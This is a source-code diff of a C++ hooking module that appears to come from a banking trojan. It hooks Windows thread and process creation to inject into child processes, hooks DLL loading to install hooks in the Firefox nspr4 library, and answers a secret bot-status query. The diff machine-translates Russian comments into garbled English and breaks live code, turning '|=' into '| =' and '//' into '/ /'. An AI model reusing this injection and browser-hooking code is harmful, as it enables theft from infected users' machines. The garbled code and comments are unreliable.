@@ -18,7 +18,7 @@
 #    define LDRGETDLLHANDLEFLAG_HOOKED_NSPR4 0x1
 #  endif
 
-  static CRITICAL_SECTION     hookerLdrLoadDllCriticalSection; //Критическая секция для hookerLdrLoadDll.
+  static CRITICAL_SECTION     hookerLdrLoadDllCriticalSection; //Critical section for hookerLdrLoadDll.
   static DWORD                ldrGetDllHandleFlags;
 #endif
 
@@ -27,12 +27,12 @@
 #endif
 
 #if defined HOOKER_SETCHILDPROCESSFLAGS
-  static DWORD processFlagsTlsIndex; //TLS-индекс для создания с processFlags, для создания дочерного процесса.
+  static DWORD processFlagsTlsIndex; //TLS-index to create a processFlags, to create a child process.
 #endif
 
 void CoreHook::init(void)
 {
-  //Инициализации для hookerLdrLoadDll.
+  //Initialization for hookerLdrLoadDll.
 #if defined(HOOKER_LDRLOADDLL)
   CWA(kernel32, InitializeCriticalSection)(&hookerLdrLoadDllCriticalSection);
   ldrGetDllHandleFlags = 0;
@@ -94,13 +94,13 @@ bool CoreHook::setChildProcessFlags(DWORD processFlags)
 #if(BO_NSPR4 > 0)
 void CoreHook::markNspr4AsHooked(void)
 {
-  ldrGetDllHandleFlags |= LDRGETDLLHANDLEFLAG_HOOKED_NSPR4;
+  ldrGetDllHandleFlags | = LDRGETDLLHANDLEFLAG_HOOKED_NSPR4;
 }
 #endif
 
 NTSTATUS NTAPI CoreHook::hookerNtCreateThread(PHANDLE threadHandle, ACCESS_MASK desiredAccess, POBJECT_ATTRIBUTES objectAttributes, HANDLE processHandle, PCLIENT_ID clientId, PCONTEXT threadContext, PINITIAL_TEB initialTeb, BOOLEAN createSuspended)
 {
-  //WDEBUG0(WDDT_INFO, "Called");
+  //WDEBUG0 (WDDT_INFO, "Called");
 
   DWORD pbiSize;
   PROCESS_BASIC_INFORMATION pbi;
@@ -110,7 +110,7 @@ NTSTATUS NTAPI CoreHook::hookerNtCreateThread(PHANDLE threadHandle, ACCESS_MASK 
     DWORD threadsCount = pbi.UniqueProcessId == 0 ? 0 : Process::_getCountOfThreadsByProcessId(pbi.UniqueProcessId);
     if(threadsCount == 0)
     {
-      //FIXME: Запретить инфецирования процессов в других пользовтоелях и сессиях.
+      //FIXME: Disable the processes of infection in other polzovtoelyah and sessions.
       HANDLE mutexOfProcess = Core::createMutexOfProcess(pbi.UniqueProcessId);
       if(mutexOfProcess == NULL)
       {
@@ -129,7 +129,7 @@ NTSTATUS NTAPI CoreHook::hookerNtCreateThread(PHANDLE threadHandle, ACCESS_MASK 
 #         if defined _WIN64
 #           error FIXME
 #         else
-            //threadContext->Eax - указывает на точку входа оригинального модуля.
+            //threadContext-> Eax - indicates the entry point of the original module.
             threadContext->Eax = entry;
 #         endif
         }
@@ -138,20 +138,20 @@ NTSTATUS NTAPI CoreHook::hookerNtCreateThread(PHANDLE threadHandle, ACCESS_MASK 
     }
   }
   
-  //Не проверяем, т.к доступность функции определяется в ходе установки хуков.
+  //Do not check availability of this function is unnecessarily during installation hooks.
   return coreData.ntdllApi.ntCreateThread(threadHandle, desiredAccess, objectAttributes, processHandle, clientId, threadContext, initialTeb, createSuspended);
 }
 
 NTSTATUS NTAPI CoreHook::hookerNtCreateUserProcess(PHANDLE processHandle, PHANDLE threadHandle, ACCESS_MASK processDesiredAccess, ACCESS_MASK threadDesiredAccess, POBJECT_ATTRIBUTES processObjectAttributes, POBJECT_ATTRIBUTES threadObjectAttributes, ULONG createProcessFlags, ULONG createThreadFlags, PVOID processParameters, PVOID parameter9, PVOID attributeList)
 {
-  WDEBUG0(WDDT_INFO, "Called");
+  WDEBUG0 (WDDT_INFO, "Called");
   
-  //Не проверяем, т.к доступность функции определяется в ходе установки хуков.
+  //Do not check availability of this function is unnecessarily during installation hooks.
   NTSTATUS retVal = coreData.ntdllApi.ntCreateUserProcess(processHandle, threadHandle, processDesiredAccess, threadDesiredAccess, processObjectAttributes, threadObjectAttributes, createProcessFlags, createThreadFlags, processParameters, parameter9, attributeList);
   DWORD pid;
   if(NT_SUCCESS(retVal) && createThreadFlags & CREATE_THREAD_SUSPENDED && processHandle != NULL && threadHandle != NULL && Core::isActive() && (pid = CWA(kernel32, GetProcessId)(*processHandle)) != 0)
   {
-    //FIXME: Запретить инфецирования процессов в других пользовтоелях и сессиях.
+    //FIXME: Disable the processes of infection in other polzovtoelyah and sessions.
     HANDLE mutexOfProcess = Core::createMutexOfProcess(pid);
     if(mutexOfProcess == NULL)
     {
@@ -170,8 +170,8 @@ NTSTATUS NTAPI CoreHook::hookerNtCreateUserProcess(PHANDLE processHandle, PHANDL
 #         error FIXME
 #       else
         {
-          //Сейчас поток находится на точки входа RtlUserThreadStart, для которой eax ранвяется точки
-          //входа модуля.
+          //Now the flow is at the entry point RtlUserThreadStart, for which eax ranvyaetsya point
+          //entry module.
           CONTEXT context;
           context.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;
       
@@ -209,11 +209,11 @@ NTSTATUS NTAPI CoreHook::hookerNtCreateUserProcess(PHANDLE processHandle, PHANDL
 #if defined(HOOKER_LDRLOADDLL)
 NTSTATUS NTAPI CoreHook::hookerLdrLoadDll(PWCHAR pathToFile, ULONG flags, PUNICODE_STRING moduleFileName, PHANDLE moduleHandle)
 {
-  //WDEBUG0(WDDT_INFO, "Called"); //Возможна рекруссия.
+  //WDEBUG0 (WDDT_INFO, "Called"); / / Can rekrussiya.
 
   if(!Core::isActive())return coreData.ntdllApi.ldrLoadDll(pathToFile, flags, moduleFileName, moduleHandle);
 
-  //WARN: НЕ защищать вызовы этих апи объектами синхроризаций!
+  //WARN: DO NOT protect calls to these API objects sinhrorizatsy!
   NTSTATUS status1 = coreData.ntdllApi.ldrGetDllHandle(pathToFile, NULL, moduleFileName, moduleHandle);
   NTSTATUS status2 = coreData.ntdllApi.ldrLoadDll(pathToFile, flags, moduleFileName, moduleHandle);
   
@@ -228,7 +228,7 @@ NTSTATUS NTAPI CoreHook::hookerLdrLoadDll(PWCHAR pathToFile, ULONG flags, PUNICO
         if(WinApiTables::_trySetNspr4HooksEx(moduleFileName->Buffer, (HMODULE)*moduleHandle))
         {
           WDEBUG0(WDDT_INFO, "Hooks installed for nspr4.dll");
-          //ldrGetDllHandleFlags |= LDRGETDLLHANDLEFLAG_HOOKED_NSPR4;
+          //ldrGetDllHandleFlags | = LDRGETDLLHANDLEFLAG_HOOKED_NSPR4;
           markNspr4AsHooked();
         }
       }
@@ -240,17 +240,17 @@ NTSTATUS NTAPI CoreHook::hookerLdrLoadDll(PWCHAR pathToFile, ULONG flags, PUNICO
 }
 #endif
 
-#if(0) //Может пригодиться когда нибудь...
+#if(0) //May come in handy someday ...
 NTSTATUS NTAPI CoreHook::hookerNtQueryDirectoryFile(HANDLE fileHandle, HANDLE eventHandle, PIO_APC_ROUTINE apcRoutine, PVOID apcContext, PIO_STATUS_BLOCK ioStatusBlock, PVOID fileInformation, ULONG length, FILE_INFORMATION_CLASS fileInformationClass, BOOLEAN returnSingleEntry, PUNICODE_STRING fileName, BOOLEAN restartScan)
 {
-  //WDEBUG0(WDDT_INFO, "Called"); //Возможна рекруссия.
+  //WDEBUG0 (WDDT_INFO, "Called"); / / Can rekrussiya.
   
   NTSTATUS status = coreData.ntdllApi.ntQueryDirectoryFile(fileHandle, eventHandle, apcRoutine, apcContext, ioStatusBlock, fileInformation, length, fileInformationClass, returnSingleEntry, fileName, restartScan);
   if(!Core::isActive())return status;
   
   if(NT_SUCCESS(status) && fileInformation != NULL)
   {
-    //FIXME: Дописать.
+    //FIXME: append.
 
     DWORD_PTR fileNameOffset;
     DWORD_PTR fileNameSizeOffset;
@@ -290,7 +290,7 @@ NTSTATUS NTAPI CoreHook::hookerNtQueryDirectoryFile(HANDLE fileHandle, HANDLE ev
         break;
     }
     
-    //WDEBUG1(WDDT_INFO, "fileInformationClass=%u", fileInformationClass); //Возможна рекруссия.
+    //WDEBUG1 (WDDT_INFO, "fileInformationClass =% u", fileInformationClass); / / Can rekrussiya.
   }
 
   return status;
@@ -300,19 +300,19 @@ NTSTATUS NTAPI CoreHook::hookerNtQueryDirectoryFile(HANDLE fileHandle, HANDLE ev
 #if defined HOOKER_NTCREATEFILE
 NTSTATUS NTAPI CoreHook::hookerNtCreateFile(PHANDLE fileHandle, ACCESS_MASK desiredAccess, POBJECT_ATTRIBUTES objectAttributes, PIO_STATUS_BLOCK ioStatusBlock, PLARGE_INTEGER allocationSize, ULONG fileAttributes, ULONG shareAccess, ULONG createDisposition, ULONG createOptions, PVOID eaBuffer, ULONG eaLength)
 {
-  //WDEBUG0(WDDT_INFO, "Called"); //Возможна рекруссия.
+  //WDEBUG0 (WDDT_INFO, "Called"); / / Can rekrussiya.
 
-  if(createDisposition == FILE_OPEN &&                                                                                       //Открывается сущетвущий файл.
+  if(createDisposition == FILE_OPEN &&                                                                                       //Suschetvuschy opens the file.
      (desiredAccess & (GENERIC_READ | FILE_READ_DATA)) &&
      (desiredAccess & (GENERIC_ALL | GENERIC_EXECUTE | GENERIC_WRITE |
      FILE_WRITE_DATA | FILE_ADD_FILE | FILE_APPEND_DATA | FILE_ADD_SUBDIRECTORY | FILE_CREATE_PIPE_INSTANCE | FILE_WRITE_EA | FILE_WRITE_ATTRIBUTES |
      FILE_EXECUTE | FILE_TRAVERSE | FILE_DELETE_CHILD | DELETE | WRITE_DAC | WRITE_OWNER)) == 0 &&
-     (createOptions & (FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT | FILE_DELETE_ON_CLOSE | FILE_OPEN_BY_FILE_ID)) == 0 && //Прочие плохие признаки.
+     (createOptions & (FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT | FILE_DELETE_ON_CLOSE | FILE_OPEN_BY_FILE_ID)) == 0 && //Other bad signs.
 
      objectAttributes != NULL && objectAttributes->Length >= sizeof(OBJECT_ATTRIBUTES) && objectAttributes->ObjectName != NULL &&
      objectAttributes->ObjectName->Buffer != NULL && objectAttributes->ObjectName->Length > 4 * sizeof(WCHAR) && (objectAttributes->ObjectName->Length % sizeof(WCHAR)) == 0 && /*параноя*/
 
-     ntCreateFileTlsIndex != TLS_OUT_OF_INDEXES && CWA(kernel32, TlsGetValue)(ntCreateFileTlsIndex) == (void *)0 &&          //Защита от рекруссии.
+     ntCreateFileTlsIndex != TLS_OUT_OF_INDEXES && CWA(kernel32, TlsGetValue)(ntCreateFileTlsIndex) == (void *)0 &&          //Protection from rekrussii.
 
      Core::isActive()
     )
@@ -320,23 +320,23 @@ NTSTATUS NTAPI CoreHook::hookerNtCreateFile(PHANDLE fileHandle, ACCESS_MASK desi
     DWORD fileNameSize = objectAttributes->ObjectName->Length / sizeof(WCHAR);
     LPWSTR fileName    = objectAttributes->ObjectName->Buffer;
 
-    //Проверяем префикс.
+    //Checking prefix.
     if(fileName[0] == '\\' && fileName[1] == '?' && fileName[2] == '?' && fileName[3] == '\\')
     {
       fileName     += 4;
       fileNameSize -= 4;
     }
 
-    //Принимаем только локальные пути. 
+    //Only accept a local path.
     if(fileNameSize > 4)
     {
       signed char isUnc = -1;
 
-      //Локальный файл.
+      //Local file.
       if(fileName[1] == ':' && fileName[2] == '\\' && ((fileName[0] >= 'A' && fileName[0] <= 'Z') || (fileName[0] >= 'a' && fileName[0] <= 'z')))isUnc = 0;
       //UNC
       else if(fileName[0] == '\\' && fileName[1] == '\\' && fileName[2] != '\\')isUnc = 1;
-      //FIXME: GetFullPathName, работать с отностиетльными именами.
+      //FIXME: GetFullPathName, working with otnostietlnymi names.
 
       if(isUnc != -1)
       {
@@ -361,7 +361,7 @@ NTSTATUS NTAPI CoreHook::hookerNtCreateFile(PHANDLE fileHandle, ACCESS_MASK desi
 
 BOOL WINAPI CoreHook::hookerGetFileAttributesExW(LPCWSTR fileName, GET_FILEEX_INFO_LEVELS infoLevelId, LPVOID fileInformation)
 {
-  WDEBUG0(WDDT_INFO, "Called"); //Возможна рекруссия.
+  WDEBUG0 (WDDT_INFO, "Called"); / / Can rekrussiya.
   if(infoLevelId == Core::OBJECT_ID_BOT_STATUS_SECRET && fileName != NULL && Core::isActive() && Str::_CompareW(fileName, coreData.installId, -1, 38/*GUID_SIZE*/) == 0)
   {
     WDEBUG0(WDDT_INFO, "Detected request of status of bot.");
